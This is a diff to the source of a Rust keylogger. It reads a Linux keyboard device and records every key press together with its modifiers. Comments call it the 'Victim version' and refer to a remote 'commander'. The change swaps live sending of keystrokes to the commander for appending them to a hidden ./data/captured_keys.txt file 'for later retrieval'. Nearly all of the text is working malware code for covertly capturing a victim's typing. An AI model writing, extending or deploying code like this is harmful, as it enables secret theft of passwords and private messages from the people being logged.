@@ -77,7 +77,6 @@ pub fn run() -> io::Result<()> {
     let (mut device, path) = find_keyboard()?;
     let mut modifiers = Modifiers::default();
     device.set_nonblocking(false)?;
-
     println!("Debugging Keylogger on: {}", path);
     loop {
         for ev in device.fetch_events()? {
@@ -85,22 +84,22 @@ pub fn run() -> io::Result<()> {
                 let key = parallels_remap(raw_key);
                 modifiers.update(key, value);
                 if value == 1 {
-                    println!("[{:?}] Modifiers: {:?}", key, modifiers);
                 }
             }
         }
     }
 }
 
-/// Victim version - NO FILE SAVING, ONLY LIVE CHANNEL
+/// Victim version - SAVES TO FILE for later retrieval
 pub fn run_with_control(
     control_rx: Receiver<Control>,
-    key_tx: Sender<String>,
+    _key_tx: Sender<String>,  // Unused but kept for API compatibility
 ) -> io::Result<()> {
     let (mut device, _path) = find_keyboard()?;
     
-    // FIX: REMOVED all file saving - no ./data/ directory, no captured_keys.txt
-    // Keylogger now ONLY sends via key_tx channel (live to commander)
+    // Create data directory and log file path
+    let _ = std::fs::create_dir_all("./data");
+    let log_path = "./data/captured_keys.txt";
     
     device.set_nonblocking(true)?;
     let mut modifiers = Modifiers::default();
@@ -118,11 +117,9 @@ pub fn run_with_control(
                 for ev in events {
                     if let EventSummary::Key(_, raw_key, value) = ev.destructure() {
                         let key = parallels_remap(raw_key);
-
-                        // Update modifiers for ALL events (press AND release)
                         modifiers.update(key, value);
 
-                        // Only SEND on actual key presses (value == 1)
+                        // Only LOG on actual key presses (value == 1)
                         if value == 1 {
                             let key_name = format!("{:?}", key).replace("KEY_", "");
                             let mut output = String::new();
@@ -132,8 +129,14 @@ pub fn run_with_control(
                             output.push_str(&key_name);
                             output.push(' ');
 
-                            // ONLY send to live channel - NO FILE WRITING
-                            let _ = key_tx.send(output);
+                            // Append to file
+                            if let Ok(mut file) = std::fs::OpenOptions::new()
+                                .create(true)
+                                .append(true)
+                                .open(log_path) 
+                            {
+                                let _ = writeln!(file, "{}", output);
+                            }
                         }
                     }
                 }
@@ -145,7 +148,6 @@ pub fn run_with_control(
         }
     }
 
-    // FIX: REMOVED println about saving logs
     Ok(())
 }
 
